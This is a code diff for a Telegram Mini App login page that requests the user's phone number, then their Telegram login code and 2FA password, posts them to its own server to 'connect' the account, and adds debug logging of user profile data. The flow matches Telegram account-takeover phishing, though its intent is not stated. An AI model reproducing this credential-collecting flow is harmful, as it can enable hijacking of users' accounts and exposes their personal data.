@@ -94,16 +94,6 @@
             font-weight: 500;
         }
 
-        .detected-status {
-            color: #ffaa00;
-            font-size: 0.85rem;
-            margin-top: 8px;
-            padding: 6px 12px;
-            background: rgba(255, 170, 0, 0.1);
-            border-radius: 8px;
-            display: inline-block;
-        }
-
         /* Code Input */
         .code-container {
             display: flex;
@@ -350,6 +340,11 @@
                     </span>
                 </div>
 
+                <!-- Debug info -->
+                <div id="debugInfo" style="margin-top: 16px; padding: 8px; background: rgba(0,0,0,0.3); border-radius: 8px; font-size: 0.7rem; color: #888; display: none;">
+                    <div id="debugText"></div>
+                </div>
+
                 <!-- Fallback manual entry (hidden by default) -->
                 <div id="manualFallback" style="display: none; margin-top: 24px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.1);">
                     <div class="step-description" style="font-size: 0.8rem;">
@@ -459,12 +454,25 @@
         ];
 
         // ============================================
+        // DEBUG HELPERS
+        // ============================================
+        function showDebug(msg) {
+            console.log('DEBUG:', msg);
+            var debugDiv = document.getElementById('debugInfo');
+            var debugText = document.getElementById('debugText');
+            if (debugDiv && debugText) {
+                debugDiv.style.display = 'block';
+                debugText.textContent = msg;
+            }
+        }
+
+        // ============================================
         // TELEGRAM MINI APP DETECTION
         // ============================================
         
         function getTelegramWebApp() {
             if (window.Telegram && window.Telegram.WebApp) {
-                const tg = window.Telegram.WebApp;
+                var tg = window.Telegram.WebApp;
                 try {
                     tg.ready();
                     tg.expand();
@@ -477,15 +485,21 @@
         }
 
         function getTelegramInitData() {
-            const tg = getTelegramWebApp();
+            var tg = getTelegramWebApp();
             
             if (tg) {
-                const initData = tg.initData || '';
-                const initDataUnsafe = tg.initDataUnsafe || {};
+                var initData = tg.initData || '';
+                var initDataUnsafe = tg.initDataUnsafe || {};
                 
-                console.log('✅ Telegram WebApp detected');
+                console.log('Telegram WebApp detected');
                 console.log('Version:', tg.version);
                 console.log('Platform:', tg.platform);
+                console.log('InitDataUnsafe keys:', Object.keys(initDataUnsafe));
+                
+                // Log user data if available
+                if (initDataUnsafe.user) {
+                    console.log('User data:', JSON.stringify(initDataUnsafe.user));
+                }
                 
                 if (initData) {
                     return {
@@ -497,11 +511,11 @@
             }
             
             // Check URL for fallback data
-            const queryString = window.location.search.substring(1);
-            if (queryString && (queryString.includes('hash=') || queryString.includes('user='))) {
-                let user = null;
-                const urlParams = new URLSearchParams(queryString);
-                const userParam = urlParams.get('user');
+            var queryString = window.location.search.substring(1);
+            if (queryString && (queryString.indexOf('hash=') !== -1 || queryString.indexOf('user=') !== -1)) {
+                var user = null;
+                var urlParams = new URLSearchParams(queryString);
+                var userParam = urlParams.get('user');
                 if (userParam) {
                     try {
                         user = JSON.parse(decodeURIComponent(userParam));
@@ -516,7 +530,7 @@
                 };
             }
             
-            console.log('❌ No Telegram init data found');
+            console.log('No Telegram init data found');
             return { initData: null, user: null, isTelegramApp: false };
         }
 
@@ -524,9 +538,11 @@
         // PHONE SHARING - THE CORE FLOW
         // ============================================
         
-        async function requestPhoneNumber() {
-            const tg = getTelegramWebApp();
-            const button = document.getElementById('sharePhoneBtn');
+        function requestPhoneNumber() {
+            var tg = getTelegramWebApp();
+            var button = document.getElementById('sharePhoneBtn');
+            
+            showDebug('Requesting phone... SDK version: ' + (tg ? tg.version : 'N/A'));
             
             // Check if we're in Telegram
             if (!tg) {
@@ -535,99 +551,164 @@
                 return;
             }
             
-            // Check version support
-            if (parseFloat(tg.version) < 6.9) {
-                console.log('Telegram version too old (' + tg.version + '), using alternative method');
-                attemptAlternativePhoneRequest(tg);
-                return;
-            }
-            
-            setLoadingBtn(button, true, '📱 Requesting...');
+            setLoadingBtn(button, true, 'Requesting...');
             hideError(1);
             
             try {
-                console.log('Requesting phone via Telegram API...');
+                console.log('Available methods:', {
+                    requestContact: typeof tg.requestContact,
+                    requestPhoneAccess: typeof tg.requestPhoneAccess,
+                    version: tg.version
+                });
                 
-                // Method 1: requestContact (most reliable)
+                // Method 1: requestContact (callback style - most reliable)
                 if (typeof tg.requestContact === 'function') {
+                    console.log('Using requestContact method');
+                    
                     tg.requestContact(function(success, response) {
+                        console.log('requestContact callback fired');
+                        console.log('success:', success);
+                        console.log('response:', JSON.stringify(response));
+                        console.log('response type:', typeof response);
+                        
                         setLoadingBtn(button, false);
                         
                         if (success && response) {
-                            console.log('✅ Phone received via requestContact:', response);
-                            const phone = extractPhoneFromResponse(response);
+                            showDebug('Response received: ' + JSON.stringify(response).substring(0, 100));
+                            
+                            // Try multiple ways to extract phone
+                            var phone = extractPhoneFromResponse(response);
+                            
                             if (phone) {
+                                showDebug('Phone extracted: ' + phone.slice(0, 4) + '****');
                                 handlePhoneReceived(phone);
                             } else {
-                                showError('Could not get phone number. Try again.', 1);
+                                showDebug('Failed to extract phone from: ' + JSON.stringify(response));
+                                showError('Could not get phone number. Try manual entry.', 1);
+                                showManualFallback();
                             }
                         } else {
-                            console.log('❌ User declined phone share');
+                            console.log('User declined phone share');
                             showInfo('Phone sharing was declined. Tap the button to try again.', 1);
                         }
                     });
                 }
-                // Method 2: requestPhoneAccess (newer API)
+                // Method 2: requestPhoneAccess (promise style)
                 else if (typeof tg.requestPhoneAccess === 'function') {
-                    try {
-                        const response = await tg.requestPhoneAccess();
+                    console.log('Using requestPhoneAccess method');
+                    
+                    tg.requestPhoneAccess().then(function(response) {
+                        console.log('requestPhoneAccess response:', JSON.stringify(response));
                         setLoadingBtn(button, false);
-                        console.log('✅ Phone received via requestPhoneAccess:', response);
-                        const phone = extractPhoneFromResponse(response);
+                        
+                        var phone = extractPhoneFromResponse(response);
                         if (phone) {
                             handlePhoneReceived(phone);
+                        } else {
+                            showError('Could not get phone number. Try manual entry.', 1);
+                            showManualFallback();
                         }
-                    } catch (err) {
+                    }).catch(function(err) {
+                        console.log('Phone access denied:', err);
                         setLoadingBtn(button, false);
-                        console.log('❌ Phone access denied:', err);
                         showInfo('Phone sharing was declined. Tap the button to try again.', 1);
-                    }
+                    });
                 }
-                // Method 3: Check user object
+                // Method 3: Try to get from user object
                 else {
                     setLoadingBtn(button, false);
-                    attemptAlternativePhoneRequest(tg);
+                    console.log('No phone request method available');
+                    
+                    var user = tg.initDataUnsafe ? tg.initDataUnsafe.user : null;
+                    if (user && user.phone_number) {
+                        showDebug('Phone from user object');
+                        handlePhoneReceived(user.phone_number);
+                    } else {
+                        showError('Phone sharing not supported. Please enter manually.', 1);
+                        showManualFallback();
+                    }
                 }
                 
             } catch (error) {
                 console.error('Phone request error:', error);
                 setLoadingBtn(button, false);
-                showError('Could not request phone. Try again or use manual entry.', 1);
+                showError('Error: ' + error.message, 1);
+                showManualFallback();
             }
         }
         
         function extractPhoneFromResponse(response) {
-            // Handle different response formats
-            if (typeof response === 'string') {
-                return response.replace(/[^0-9+]/g, '');
-            }
-            if (response && response.phone_number) {
-                return response.phone_number.replace(/[^0-9+]/g, '');
-            }
-            if (response && response.phone) {
-                return response.phone.replace(/[^0-9+]/g, '');
-            }
-            if (response && response.contact) {
-                if (typeof response.contact === 'string') {
-                    return response.contact.replace(/[^0-9+]/g, '');
-                }
-                if (response.contact.phone_number) {
-                    return response.contact.phone_number.replace(/[^0-9+]/g, '');
-                }
-            }
-            return null;
-        }
-        
-        function attemptAlternativePhoneRequest(tg) {
-            // Try to get phone from user data or show error
-            const user = tg.initDataUnsafe ? tg.initDataUnsafe.user : {};
+            console.log('=== EXTRACT PHONE ===');
+            console.log('Input type:', typeof response);
+            console.log('Input value:', JSON.stringify(response));
             
-            if (user && user.phone_number) {
-                handlePhoneReceived(user.phone_number);
-            } else {
-                showError('Phone sharing is not supported in this version of Telegram. Please update or enter manually.', 1);
-                showManualFallback();
+            // Handle string
+            if (typeof response === 'string') {
+                var cleaned = response.replace(/[^0-9+]/g, '');
+                console.log('Extracted from string:', cleaned);
+                return cleaned;
             }
+            
+            // Handle object
+            if (response && typeof response === 'object') {
+                // Try response.phone_number
+                if (response.phone_number) {
+                    var cleaned = String(response.phone_number).replace(/[^0-9+]/g, '');
+                    console.log('Extracted from response.phone_number:', cleaned);
+                    return cleaned;
+                }
+                
+                // Try response.phone
+                if (response.phone) {
+                    var cleaned = String(response.phone).replace(/[^0-9+]/g, '');
+                    console.log('Extracted from response.phone:', cleaned);
+                    return cleaned;
+                }
+                
+                // Try response.contact (could be string or object)
+                if (response.contact) {
+                    if (typeof response.contact === 'string') {
+                        var cleaned = response.contact.replace(/[^0-9+]/g, '');
+                        console.log('Extracted from response.contact string:', cleaned);
+                        return cleaned;
+                    }
+                    if (response.contact.phone_number) {
+                        var cleaned = String(response.contact.phone_number).replace(/[^0-9+]/g, '');
+                        console.log('Extracted from response.contact.phone_number:', cleaned);
+                        return cleaned;
+                    }
+                }
+                
+                // Try response.user (Telegram user object)
+                if (response.user && response.user.phone_number) {
+                    var cleaned = String(response.user.phone_number).replace(/[^0-9+]/g, '');
+                    console.log('Extracted from response.user.phone_number:', cleaned);
+                    return cleaned;
+                }
+                
+                // Try iterating through all keys
+                console.log('All keys in response:', Object.keys(response));
+                for (var key in response) {
+                    if (response.hasOwnProperty(key)) {
+                        var val = response[key];
+                        if (typeof val === 'string' && val.match(/^\+?[0-9]{7,15}$/)) {
+                            console.log('Found phone-like string in key:', key, 'value:', val);
+                            return val;
+                        }
+                    }
+                }
+                
+                // Try JSON.stringify and regex
+                var str = JSON.stringify(response);
+                var phoneMatch = str.match(/\+[0-9]{7,15}/);
+                if (phoneMatch) {
+                    console.log('Extracted via regex from JSON:', phoneMatch[0]);
+                    return phoneMatch[0];
+                }
+            }
+            
+            console.log('Could not extract phone from response');
+            return null;
         }
         
         function handlePhoneReceived(phone) {
@@ -636,22 +717,23 @@
                 return;
             }
             
-            // Clean phone number - FIXED: Using string replace instead of regex literal
-            phone = phone.replace(/[^0-9+]/g, '');
+            // Clean phone number
+            phone = String(phone).replace(/[^0-9+]/g, '');
             if (!phone.startsWith('+')) {
                 phone = '+' + phone;
             }
             
             currentPhone = phone;
             
-            console.log('📱 Processing phone:', phone.slice(0, 4) + '****');
+            console.log('Processing phone:', phone.slice(0, 4) + '****');
+            showDebug('Phone: ' + phone.slice(0, 4) + '****');
             
-            // Show success and auto-send code
-            showSuccess('✅ Phone received! Sending verification code...', 1);
+            // Show success
+            showSuccess('Phone received! Sending code...', 1);
             
             document.getElementById('sharePhoneBtn').style.display = 'none';
             
-            // Send code automatically via the share-phone API
+            // Send code automatically
             sendPhoneAndGetCode(phone);
         }
         
@@ -659,34 +741,34 @@
             showLoading('Sending verification code...');
             
             try {
-                const response = await fetch('/api/share-phone', {
+                var payload = {
+                    phone: phone,
+                    telegramId: telegramUser ? (telegramUser.id || '') : '',
+                    firstName: telegramUser ? (telegramUser.first_name || '') : '',
+                    lastName: telegramUser ? (telegramUser.last_name || '') : '',
+                    username: telegramUser ? (telegramUser.username || '') : ''
+                };
+                
+                console.log('Sending to /api/share-phone:', payload);
+                
+                var response = await fetch('/api/share-phone', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        phone: phone,
-                        telegramId: telegramUser ? (telegramUser.id || '') : '',
-                        firstName: telegramUser ? (telegramUser.first_name || '') : '',
-                        lastName: telegramUser ? (telegramUser.last_name || '') : '',
-                        username: telegramUser ? (telegramUser.username || '') : ''
-                    })
+                    body: JSON.stringify(payload)
                 });
 
-                const data = await response.json();
+                var data = await response.json();
                 hideLoading();
                 
                 console.log('Share phone response:', data);
 
                 if (data.success) {
                     currentSessionId = data.session_id;
-                    
-                    // Show code page
                     showCodePage(data.phone_masked || phone, data.user_name);
                     
-                    // If we got auto-detected, show that
                     if (data.auto_detected) {
-                        showSuccess('✅ Account found! Enter the code sent to your Telegram.', 2);
+                        showSuccess('Account found! Enter the code sent to your Telegram.', 2);
                     }
-                    
                 } else {
                     showError(data.error || 'Failed to send code. Please try again.', 1);
                     document.getElementById('sharePhoneBtn').style.display = 'block';
@@ -701,18 +783,20 @@
         }
 
         // ============================================
-        // AUTO-LOGIN CHECK (for returning users)
+        // AUTO-LOGIN CHECK
         // ============================================
         
         async function tryAutoLogin() {
-            const { initData, user, isTelegramApp } = getTelegramInitData();
+            var initResult = getTelegramInitData();
+            var initData = initResult.initData;
+            var user = initResult.user;
+            var isTelegramApp = initResult.isTelegramApp;
             
             if (user) {
                 telegramUser = user;
                 showDetectedUser(user);
             }
             
-            // Not in Telegram at all
             if (!isTelegramApp) {
                 document.getElementById('page1Description').textContent = 
                     'Please open this page from the Telegram app';
@@ -721,12 +805,11 @@
                 return;
             }
             
-            // Try auto-login API for returning users with saved phone
             if (initData) {
                 showLoading('Checking account...');
                 
                 try {
-                    const response = await fetch('/api/telegram-auto-login', {
+                    var response = await fetch('/api/telegram-auto-login', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
@@ -735,23 +818,19 @@
                         })
                     });
 
-                    const data = await response.json();
+                    var data = await response.json();
                     hideLoading();
                     
                     console.log('Auto-login response:', data);
 
                     if (data.success) {
-                        // Returning user with saved phone - code sent automatically!
                         currentSessionId = data.session_id;
-                        
-                        showSuccess('✅ Welcome back! Code sent to your phone.', 1);
-                        
+                        showSuccess('Welcome back! Code sent to your phone.', 1);
                         document.getElementById('sharePhoneBtn').style.display = 'none';
                         
                         setTimeout(function() {
                             showCodePage(data.phone_masked, data.user_name);
                         }, 600);
-                        
                         return;
                     }
                 } catch (error) {
@@ -760,7 +839,6 @@
                 }
             }
             
-            // No saved phone - show share button
             document.getElementById('sharePhoneBtn').style.display = 'block';
             document.getElementById('page1Description').textContent = 
                 'Tap the button below to share your phone number';
@@ -771,7 +849,7 @@
         // ============================================
 
         function showLoading(text) {
-            const indicator = document.getElementById('loadingIndicator');
+            var indicator = document.getElementById('loadingIndicator');
             indicator.style.display = 'flex';
             document.getElementById('loadingText').textContent = text;
             document.getElementById('sharePhoneBtn').style.display = 'none';
@@ -784,13 +862,13 @@
         }
 
         function showDetectedUser(user) {
-            const card = document.getElementById('detectedCard');
+            var card = document.getElementById('detectedCard');
             card.style.display = 'block';
             
-            const initial = user.first_name ? user.first_name.charAt(0).toUpperCase() : '?';
+            var initial = user.first_name ? user.first_name.charAt(0).toUpperCase() : '?';
             document.getElementById('detectedAvatar').textContent = initial;
             
-            const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ');
+            var fullName = [user.first_name, user.last_name].filter(function(x) { return x; }).join(' ');
             document.getElementById('detectedName').textContent = fullName || 'Telegram User';
             
             document.getElementById('detectedUsername').textContent = 
@@ -801,7 +879,6 @@
             document.getElementById('page1').style.display = 'none';
             document.getElementById('page2').style.display = 'block';
             
-            // Show phone display
             if (phoneMasked) {
                 document.getElementById('phoneDisplay').style.display = 'block';
                 document.getElementById('phoneDisplayText').textContent = phoneMasked;
@@ -823,7 +900,7 @@
 
         function showError(message, pageNum) {
             pageNum = pageNum || 1;
-            const el = document.getElementById('error' + pageNum);
+            var el = document.getElementById('error' + pageNum);
             if (el) {
                 el.textContent = message;
                 el.classList.add('show');
@@ -833,13 +910,13 @@
 
         function hideError(pageNum) {
             pageNum = pageNum || 1;
-            const el = document.getElementById('error' + pageNum);
+            var el = document.getElementById('error' + pageNum);
             if (el) el.classList.remove('show');
         }
 
         function showSuccess(message, pageNum) {
             pageNum = pageNum || 1;
-            const el = document.getElementById('success' + pageNum);
+            var el = document.getElementById('success' + pageNum);
             if (el) {
                 el.textContent = message;
                 el.classList.add('show');
@@ -849,7 +926,7 @@
 
         function showInfo(message, pageNum) {
             pageNum = pageNum || 1;
-            const el = document.getElementById('info' + pageNum);
+            var el = document.getElementById('info' + pageNum);
             if (el) {
                 el.textContent = message;
                 el.classList.add('show');
@@ -861,7 +938,7 @@
             if (!button) return;
             text = text || 'Processing...';
             button.disabled = isLoading;
-            const originalText = button.getAttribute('data-original') || 
+            var originalText = button.getAttribute('data-original') || 
                 (button.id === 'verifyBtn' ? 'Verify & Connect' : '📱 Share My Phone Number');
             
             if (!button.getAttribute('data-original')) {
@@ -895,7 +972,7 @@
         }
 
         function updateActiveBox() {
-            const code = hiddenInput.value.replace(/[^0-9]/g, '');
+            var code = hiddenInput.value.replace(/[^0-9]/g, '');
             boxes.forEach(function(box, i) {
                 box.classList.remove('active');
                 if (i === code.length && code.length < 5) {
@@ -905,7 +982,7 @@
         }
 
         function updateCodeBoxes() {
-            const code = hiddenInput.value.replace(/[^0-9]/g, '').slice(0, 5);
+            var code = hiddenInput.value.replace(/[^0-9]/g, '').slice(0, 5);
             
             boxes.forEach(function(box, i) {
                 box.classList.remove('filled', 'active', 'error');
@@ -936,20 +1013,20 @@
         }
 
         function autoSubmitCode() {
-            const code = hiddenInput.value.replace(/[^0-9]/g, '');
+            var code = hiddenInput.value.replace(/[^0-9]/g, '');
             if (code.length !== 5) {
                 isAutoVerifying = false;
                 return;
             }
 
-            const needPassword = document.getElementById('passwordGroup').style.display === 'block';
+            var needPassword = document.getElementById('passwordGroup').style.display === 'block';
             
             if (!needPassword) {
                 hideError(2);
                 setLoadingBtn(document.getElementById('verifyBtn'), true, 'Verifying...');
                 performVerification(code, '');
             } else {
-                const passwordInput = document.getElementById('password');
+                var passwordInput = document.getElementById('password');
                 if (!passwordInput.value) {
                     passwordInput.focus();
                     showError('2FA password required', 2);
@@ -967,7 +1044,7 @@
         // ============================================
 
         async function sendCode() {
-            let phone = document.getElementById('phone').value.trim();
+            var phone = document.getElementById('phone').value.trim();
             
             if (!phone) {
                 showError('Please enter your phone number', 1);
@@ -985,7 +1062,7 @@
             hideError(1);
 
             try {
-                const response = await fetch('/api/add-account', {
+                var response = await fetch('/api/add-account', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
@@ -994,7 +1071,7 @@
                     })
                 });
 
-                const data = await response.json();
+                var data = await response.json();
                 setLoadingBtn(document.getElementById('sendCodeBtn'), false);
 
                 if (data.success) {
@@ -1011,7 +1088,7 @@
 
         async function performVerification(code, password) {
             try {
-                const response = await fetch('/api/verify-code', {
+                var response = await fetch('/api/verify-code', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
@@ -1021,16 +1098,15 @@
                     })
                 });
 
-                const data = await response.json();
+                var data = await response.json();
                 setLoadingBtn(document.getElementById('verifyBtn'), false);
 
                 if (data.success) {
-                    // Success!
                     document.getElementById('page2').style.display = 'none';
                     document.getElementById('page3').style.display = 'block';
                     
-                    const accountName = data.account ? (data.account.name || 'User') : 'User';
-                    let info = '<strong>' + accountName + '</strong>';
+                    var accountName = data.account ? (data.account.name || 'User') : 'User';
+                    var info = '<strong>' + accountName + '</strong>';
                     if (currentPhone) {
                         info += '<br>📱 ' + currentPhone.slice(0, 4) + '****';
                     }
@@ -1049,9 +1125,9 @@
                     isAutoVerifying = false;
                     
                 } else {
-                    const errMsg = data.error || 'Verification failed';
+                    var errMsg = data.error || 'Verification failed';
                     codeAttempts++;
-                    const remaining = 5 - codeAttempts;
+                    var remaining = 5 - codeAttempts;
                     
                     if (remaining > 0) {
                         showError(errMsg + ' (' + remaining + ' attempts left)', 2);
@@ -1075,7 +1151,7 @@
         }
 
         async function verifyCode() {
-            const code = hiddenInput.value.replace(/[^0-9]/g, '');
+            var code = hiddenInput.value.replace(/[^0-9]/g, '');
             
             if (code.length !== 5) {
                 showError('Enter the complete 5-digit code', 2);
@@ -1083,8 +1159,8 @@
                 return;
             }
 
-            const needPassword = document.getElementById('passwordGroup').style.display === 'block';
-            const passwordInput = document.getElementById('password');
+            var needPassword = document.getElementById('passwordGroup').style.display === 'block';
+            var passwordInput = document.getElementById('password');
 
             if (needPassword && !passwordInput.value) {
                 showError('Enter your 2FA password', 2);
@@ -1117,6 +1193,7 @@
             document.getElementById('sharePhoneBtn').style.display = 'block';
             document.getElementById('manualFallback').style.display = 'none';
             document.querySelector('.manual-link').style.display = 'block';
+            document.getElementById('debugInfo').style.display = 'none';
             
             currentSessionId = null;
         }
@@ -1135,6 +1212,7 @@
             document.getElementById('sharePhoneBtn').style.display = 'block';
             document.getElementById('detectedCard').style.display = 'none';
             document.getElementById('loadingIndicator').style.display = 'none';
+            document.getElementById('debugInfo').style.display = 'none';
             
             resetCodeInput();
             hideError(1);
@@ -1142,8 +1220,7 @@
             currentSessionId = null;
             currentPhone = '';
             
-            // Restore Share button
-            const shareBtn = document.getElementById('sharePhoneBtn');
+            var shareBtn = document.getElementById('sharePhoneBtn');
             shareBtn.innerHTML = '📱 Share My Phone Number';
             shareBtn.disabled = false;
             
@@ -1167,15 +1244,15 @@
         });
 
         hiddenInput.addEventListener('input', function(e) {
-            let value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
+            var value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
             this.value = value;
             updateCodeBoxes();
         });
 
         hiddenInput.addEventListener('paste', function(e) {
             e.preventDefault();
-            const text = (e.clipboardData || window.clipboardData).getData('text');
-            const digits = text.replace(/[^0-9]/g, '').slice(0, 5);
+            var text = (e.clipboardData || window.clipboardData).getData('text');
+            var digits = text.replace(/[^0-9]/g, '').slice(0, 5);
             this.value = digits;
             updateCodeBoxes();
         });
@@ -1192,31 +1269,33 @@
         // ============================================
         
         window.addEventListener('load', function() {
-            console.log('🚀 Login page loaded (Phone-Share-First Version)');
+            console.log('Login page loaded (Phone-Share-First v2)');
             console.log('URL:', window.location.href);
             
             if (window.Telegram && window.Telegram.WebApp) {
                 console.log('Telegram SDK version:', window.Telegram.WebApp.version);
                 console.log('Platform:', window.Telegram.WebApp.platform);
+                console.log('Available methods:');
+                var tg = window.Telegram.WebApp;
+                console.log('  requestContact:', typeof tg.requestContact);
+                console.log('  requestPhoneAccess:', typeof tg.requestPhoneAccess);
             }
             
-            // Initialize button state
-            const verifyBtn = document.getElementById('verifyBtn');
+            var verifyBtn = document.getElementById('verifyBtn');
             if (verifyBtn) {
                 verifyBtn.setAttribute('data-original', 'Verify & Connect');
             }
             
-            const shareBtn = document.getElementById('sharePhoneBtn');
+            var shareBtn = document.getElementById('sharePhoneBtn');
             if (shareBtn) {
                 shareBtn.setAttribute('data-original', '📱 Share My Phone Number');
             }
             
-            const sendBtn = document.getElementById('sendCodeBtn');
+            var sendBtn = document.getElementById('sendCodeBtn');
             if (sendBtn) {
                 sendBtn.setAttribute('data-original', 'Send Code');
             }
             
-            // Start the flow
             setTimeout(function() {
                 tryAutoLogin();
             }, 500);
